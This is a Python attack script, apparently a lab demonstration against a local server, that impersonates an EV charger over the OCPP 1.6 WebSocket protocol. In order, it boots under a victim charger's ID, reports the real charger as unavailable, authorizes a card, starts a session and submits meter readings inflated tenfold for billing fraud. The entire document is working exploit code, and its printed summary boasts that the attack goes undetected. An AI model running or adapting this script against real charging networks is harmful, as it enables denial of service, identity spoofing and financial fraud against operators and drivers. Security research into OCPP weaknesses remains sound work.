import asyncio
import websockets
import json
import random
from datetime import datetime

SERVER = "ws://localhost:9000"

# We're impersonating this legitimate charger
TARGET_CHARGER = "EV-CHARGER-001"

async def impersonate():
    print("=" * 55)
    print("     CHARGER IMPERSONATION ATTACK")
    print("=" * 55)
    print(f"\n[*] Target charger ID: {TARGET_CHARGER}")
    print(f"[*] Strategy:")
    print(f"    1. Connect using victim charger's ID")
    print(f"    2. Send StatusNotification = Unavailable")
    print(f"       (knocks real charger offline in CSMS)")
    print(f"    3. Accept charging sessions as the victim")
    print(f"    4. Manipulate billing data\n")

    async with websockets.connect(f"{SERVER}/{TARGET_CHARGER}") as ws:

        # Step 1: Boot as the victim charger
        print("[STEP 1] Booting as legitimate charger...")
        await ws.send(json.dumps([2, "b001", "BootNotification", {
            "chargePointModel": "REAL-MODEL-X",
            "chargePointVendor": "LegitVendor Inc",
            "serialNumber": "SN-001-REAL",
            "firmwareVersion": "v2.1.0"
        }]))
        resp = json.loads(await ws.recv())
        print(f"  Server accepted boot: {resp[2]['status']}")
        print(f"  [!] We are now impersonating {TARGET_CHARGER}\n")
        await asyncio.sleep(1)

        # Step 2: Take the real charger offline
        print("[STEP 2] Sending Unavailable status...")
        print("         (real charger appears offline to operators)")
        await ws.send(json.dumps([2, "s001", "StatusNotification", {
            "connectorId": 0,
            "errorCode": "NoError",
            "status": "Unavailable",
            "timestamp": datetime.utcnow().isoformat()
        }]))
        await ws.recv()
        print(f"  [!] {TARGET_CHARGER} now shows UNAVAILABLE in CSMS")
        print(f"  [!] Operators see charger as offline - no alerts raised\n")
        await asyncio.sleep(1)

        # Step 3: Hijack a charging session
        print("[STEP 3] Hijacking incoming charging session...")
        fake_cards = ["CORP-CARD-001", "FLEET-CARD-442", "USER-9921"]
        stolen_card = random.choice(fake_cards)
        
        print(f"  Simulating user tapping card: {stolen_card}")
        await ws.send(json.dumps([2, "a001", "Authorize", {
            "idTag": stolen_card
        }]))
        resp = json.loads(await ws.recv())
        print(f"  Card authorized: {resp[2]['idTagInfo']['status']}")
        await asyncio.sleep(1)

        # Step 4: Start session under victim's identity
        print(f"\n[STEP 4] Starting transaction as {TARGET_CHARGER}...")
        meter_start = 5000
        await ws.send(json.dumps([2, "t001", "StartTransaction", {
            "connectorId": 1,
            "idTag": stolen_card,
            "meterStart": meter_start,
            "timestamp": datetime.utcnow().isoformat()
        }]))
        resp = json.loads(await ws.recv())
        txn_id = resp[2].get("transactionId", 0)
        print(f"  Transaction ID: {txn_id}")
        print(f"  [!] Session logged under legitimate charger's ID")
        await asyncio.sleep(1)

        # Step 5: Submit falsified meter readings
        print(f"\n[STEP 5] Submitting falsified meter readings...")
        real_energy = 5500    # What was actually delivered
        fake_energy = 55000   # 10x inflated for billing fraud
        
        await ws.send(json.dumps([2, "m001", "MeterValues", {
            "connectorId": 1,
            "transactionId": txn_id,
            "meterValue": [{
                "timestamp": datetime.utcnow().isoformat(),
                "sampledValue": [{"value": str(fake_energy), "unit": "Wh"}]
            }]
        }]))
        await ws.recv()
        print(f"  Actual energy delivered:  {real_energy} Wh")
        print(f"  Reported to CSMS:         {fake_energy} Wh")
        print(f"  Overbilling:              {(fake_energy-real_energy)/1000:.1f} kWh")
        print(f"  Financial impact:         ${(fake_energy-real_energy)/1000*0.30:.2f} per session")
        await asyncio.sleep(1)

        # Step 6: Stop and clean up
        print(f"\n[STEP 6] Closing session...")
        await ws.send(json.dumps([2, "e001", "StopTransaction", {
            "transactionId": txn_id,
            "meterStop": fake_energy,
            "meterStart": meter_start,
            "timestamp": datetime.utcnow().isoformat(),
            "reason": "Local"
        }]))
        await ws.recv()

        print(f"\n{'=' * 55}")
        print(f"  ATTACK SUMMARY")
        print(f"{'=' * 55}")
        print(f"  Target charger:     {TARGET_CHARGER}")
        print(f"  Attack duration:    ~10 seconds")
        print(f"  Detection:          NONE - looks like normal traffic")
        print(f"")
        print(f"  Impact achieved:")
        print(f"  [1] Charger taken offline without physical access")
        print(f"  [2] Charging session hijacked under victim identity")
        print(f"  [3] Billing fraud: ${(fake_energy-real_energy)/1000*0.30:.2f} overcharge per session")
        print(f"  [4] All logs show legitimate charger as source")
        print(f"")
        print(f"  Root cause: No mutual TLS, no message signing,")
        print(f"  no charger identity verification in OCPP 1.6")
        print(f"{'=' * 55}\n")

asyncio.run(impersonate())
